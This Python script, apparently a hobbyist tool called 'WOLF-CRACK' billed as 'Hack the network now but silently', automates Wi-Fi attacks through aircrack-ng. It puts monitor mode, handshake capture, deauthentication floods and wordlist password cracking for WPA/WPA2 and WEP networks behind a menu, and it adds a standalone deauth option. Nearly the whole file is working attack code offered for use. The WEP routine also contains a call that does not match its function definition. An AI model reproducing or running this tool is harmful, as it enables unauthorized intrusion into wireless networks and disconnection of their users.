import subprocess, signal, time, os

BLACK = "\033[0;30m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BROWN = "\033[0;33m"
BLUE = "\033[0;34m"
PURPLE = "\033[0;35m"
CYAN = "\033[0;36m"
LIGHT_GRAY = "\033[0;37m"
DARK_GRAY = "\033[1;30m"
LIGHT_RED = "\033[1;31m"
LIGHT_GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
LIGHT_BLUE = "\033[1;34m"
LIGHT_PURPLE = "\033[1;35m"
LIGHT_CYAN = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"

os.system("cls||clear")
print(f"""

{YELLOW}                     .   {YELLOW}
{YELLOW}                    / V\ {YELLOW}       _    _  _____ _     ______      _____ ______  ___  _____  _   __
{YELLOW}                  / `  / {YELLOW}      | |  | ||  _  | |    |  ___|    /  __ \| ___ \/ _ \/  __ \| | / /
{YELLOW}                 <<   |  {YELLOW}      | |  | || | | | |    | |_ {RED} ____ {YELLOW}| /  \/| |_/ / /_\ \ /  \/| |/ / 
{YELLOW}                 /    |  {YELLOW}      | |/\| || | | | |    |  _|{RED}|____|{YELLOW}| |    |    /|  _  | |    |    \ 
{YELLOW}               /      |  {YELLOW}      \  /\  /\ \_/ / |____| |        | \__/\| |\ \| | | | \__/\| |\  \ 
{YELLOW}              /       |  {YELLOW}       \/  \/  \___/\_____/\_|         \____/\_| \_\_| |_/\____/\_| \_/
{YELLOW}             /        |  {RED}    +{YELLOW} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{RED} +
{YELLOW}           /    \  \ /   {YELLOW}    |   {RED}   V 1.0   {YELLOW}   Hack the network now but silently {RED}    V 1.0    {YELLOW}  |
{YELLOW}          (      ) | |   {YELLOW}    | {RED} This is just a trial version, the full version released later {YELLOW}  | 
{YELLOW}  ________|   _/_  | |   {YELLOW}    |   {RED} Github: @rrsvkk {YELLOW} | {RED} Youtube: @rrsvkk {YELLOW} | {RED} Instagram: @rrsvkk {YELLOW}  | 
{YELLOW}<__________\______)\__)  {RED}    + {YELLOW}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{RED} +
      
""")

def select_attack():
    print(f"")
    print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Welcome, select attack type {YELLOW}:{LIGHT_WHITE} ")
    print("")
    print(f"{YELLOW}   [{RED}0{YELLOW}] {LIGHT_WHITE}WPA / WPA2 Attack {YELLOW}{LIGHT_WHITE} ")
    print(f"{YELLOW}   [{RED}1{YELLOW}] {LIGHT_WHITE}WEP Attack {YELLOW}{LIGHT_WHITE} ")
    print(f"{YELLOW}   [{RED}2{YELLOW}] {LIGHT_WHITE}Network Deauth {YELLOW}{LIGHT_WHITE} ")
    print("")
    select = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Select once{YELLOW} :{LIGHT_WHITE} ")
    print("")
    if select == "0":
        WPA_WPA2_hack()
    elif select == "1":
        WEP_hack()
    elif select == "2":
        net_deauth_attack()
    else:
        print(f"{YELLOW}   [{RED}*{YELLOW}] {LIGHT_WHITE}The value you entered does not exist {YELLOW}...{LIGHT_WHITE}\n")

def WPA_WPA2_hack():
    def get_network_interfaces():
        result = subprocess.run("iwconfig 2>/dev/null", shell=True, text=True, capture_output=True)
        interfaces = []
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def choose_interface():
        interfaces = get_network_interfaces()
        if not interfaces:
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}No network cards found {YELLOW}...\n")
            exit()

        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}ًWIFI Interface{YELLOW} :{LIGHT_WHITE} ")
        for i, iface in enumerate(interfaces):
            print("")
            print(f"   {YELLOW}[{RED}{i}{YELLOW}] {LIGHT_WHITE}{iface}")
            print("")

        choice = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Choice WI-FI Interface{YELLOW} :{LIGHT_WHITE} ")
        try:
            return interfaces[int(choice)]
        except (ValueError, IndexError):
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Invalid choice. {YELLOW}❌")
            exit()

    def monitor_mode_on(interface):
        subprocess.run(f"airmon-ng start {interface}", shell=True)
        time.sleep(2)
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅ \n")
        time.sleep(3)

    def show_wifi_list(mon_interface):
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Network monitoring for 15 seconds {YELLOW}...")
        time.sleep(3)
        proc = subprocess.Popen(["airodump-ng", mon_interface])
        time.sleep(15)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Discontinued airodump-ng {YELLOW}... \n")
        time.sleep(2)

    def get_handshake(net_bssid, net_channel, capture_filename, mon_interface):
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Capture the package for 150 seconds {YELLOW}...")
        time.sleep(2)
        proc = subprocess.Popen(["airodump-ng", "--bssid", net_bssid, "--channel", net_channel, "--write", f"capturefile/{capture_filename}", mon_interface])
        net_deauth(net_bssid, mon_interface)
        time.sleep(150)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Packages saved {YELLOW}✅\n")
        time.sleep(2)

    def net_deauth(net_bssid, mon_interface):
        proc = subprocess.Popen(["xterm", "-hold", "-e", f"sudo aireplay-ng --deauth 25 -a {net_bssid} {mon_interface}"])
        time.sleep(25)
        proc.send_signal(signal.SIGINT)
        proc.wait()

    
    def end_attack(passlist, net_bssid, capture_filename):
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Check passwords with handcheck file {YELLOW}...{LIGHT_WHITE}")
        time.sleep(2)
        subprocess.run(["aircrack-ng", "-w", passlist, "-b", net_bssid, f"capturefile/{capture_filename}-01.cap"])
        time.sleep(2)

    def monitor_mode_off(mon_interface):
        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
        time.sleep(8)
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
        time.sleep(2)

    def start_hack():
        interface = choose_interface()
        monitor_mode_on(interface)

        mon_interface = choose_interface()

        show_wifi_list(mon_interface)

        net_bssid = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter WI-FI BSSID {YELLOW}:{LIGHT_WHITE} ")
        net_channel = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter WI-FI Channel {YELLOW}:{LIGHT_WHITE} ")
        capture_filename = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter capture file name {YELLOW}:{LIGHT_WHITE} ")
        get_handshake(net_bssid, net_channel, capture_filename, mon_interface)

        passlist = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter the path of the password file {YELLOW}:{LIGHT_WHITE} ")
        end_attack(passlist, net_bssid, capture_filename)

        monitor_mode_off(mon_interface)

    start_hack()

def WEP_hack():

    def get_network_interfaces():
        result = subprocess.run("iwconfig 2>/dev/null", shell=True, text=True, capture_output=True)
        interfaces = []
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def choose_interface():
        interfaces = get_network_interfaces()
        if not interfaces:
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}No network cards found {YELLOW}...\n")
            exit()

        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}ًWIFI Interface{YELLOW} :{LIGHT_WHITE} ")
        for i, iface in enumerate(interfaces):
            print("")
            print(f"   {YELLOW}[{RED}{i}{YELLOW}] {LIGHT_WHITE}{iface}")
            print("")

        choice = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Choice WI-FI Interface{YELLOW} :{LIGHT_WHITE} ")
        try:
            return interfaces[int(choice)]
        except (ValueError, IndexError):
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Invalid choice. {YELLOW}❌")
            exit()
    
    def monitor_mode_on(interface):
        subprocess.run(f"airmon-ng start {interface}", shell=True)
        time.sleep(2)
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅\n")
        time.sleep(4)

    def show_wifi_list(mon_interface):
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Network monitoring for 15 seconds {YELLOW}...")
        time.sleep(3)
        proc = subprocess.Popen(["airodump-ng", mon_interface])
        time.sleep(15)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Discontinued airodump-ng {YELLOW}... \n")
        time.sleep(2)

    def get_handshake(net_bssid, net_channel, capture_filename, mon_interface):
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Capture the package for 150 seconds {YELLOW}...")
        time.sleep(2)
        proc = subprocess.Popen(["airodump-ng", "--bssid", net_bssid, "--channel", net_channel, "--write", f"capturefile/{capture_filename}", mon_interface])
        time.sleep(300)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Packages saved {YELLOW}✅\n")
        time.sleep(2)

    def end_attack(capture_filename):
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Check passwords with handcheck file {YELLOW}...{LIGHT_WHITE}")
        time.sleep(3)
        subprocess.run(["aircrack-ng", f"capturefile/{capture_filename}-01.cap"])
        time.sleep(3)

    def monitor_mode_off(mon_interface):
        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
        time.sleep(8)
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
        time.sleep(3)

    def start_hack():
        interface = choose_interface()
        monitor_mode_on(interface)

        mon_interface = choose_interface()

        show_wifi_list(mon_interface)

        net_bssid = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter WI-FI BSSID {YELLOW}:{LIGHT_WHITE} ")
        net_channel = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter WI-FI Channel {YELLOW}:{LIGHT_WHITE} ")
        capture_filename = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter capture file name {YELLOW}:{LIGHT_WHITE} ")
        get_handshake(net_bssid, net_channel, capture_filename, mon_interface)

        passlist = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter the path of the password file {YELLOW}:{LIGHT_WHITE} ")
        end_attack(passlist, net_bssid, capture_filename)

        monitor_mode_off(mon_interface)
    
    start_hack()

def net_deauth_attack():
    def get_network_interfaces():
        result = subprocess.run("iwconfig 2>/dev/null", shell=True, text=True, capture_output=True)
        interfaces = []
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def choose_interface():
        interfaces = get_network_interfaces()
        if not interfaces:
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}No network cards found {YELLOW}...\n")
            exit()

        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}ًWIFI Interface{YELLOW} :{LIGHT_WHITE} ")
        for i, iface in enumerate(interfaces):
            print("")
            print(f"   {YELLOW}[{RED}{i}{YELLOW}] {LIGHT_WHITE}{iface}")
            print("")

        choice = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Choice WI-FI Interface{YELLOW} :{LIGHT_WHITE} ")
        try:
            return interfaces[int(choice)]
        except (ValueError, IndexError):
            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Invalid choice. {YELLOW}❌")
            exit()
    
    def start_monitor_mode(interface):
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Turn on monitor mode {YELLOW}...\n {LIGHT_WHITE}")
        subprocess.run(f"airmon-ng start {interface}", shell=True)
        time.sleep(2)
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅\n")
        time.sleep(4)
    
    def show_wifi_list(mon_interface):
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Network monitoring for 15 seconds {YELLOW}...")
        time.sleep(3)
        proc = subprocess.Popen(["airodump-ng", mon_interface])
        time.sleep(15)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Discontinued airodump-ng {YELLOW}... \n")
        time.sleep(2)

    def start_deauth_attack(deauth_num, net_bssid, mon_interface):
        print("{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Start deauth attack {YELLOW}...")
        attack = subprocess.run(["aireplay-ng", "--deauth", deauth_num, "-a", net_bssid, mon_interface])
    
    def monitor_mode_off(mon_interface):
        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
        time.sleep(8)
        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
        time.sleep(3)

    def start_hack():
        interface = choose_interface()

        start_monitor_mode(interface)

        mon_interface = choose_interface()

        show_wifi_list(mon_interface)

        deauth_num = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter Number of disconnected devices {YELLOW}:{LIGHT_WHITE} ")
        net_bssid = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Enter WI-FI BSSID {YELLOW}:{LIGHT_WHITE} ")
        start_deauth_attack(deauth_num, net_bssid, mon_interface)

        monitor_mode_off(mon_interface)

    start_hack()


select_attack()
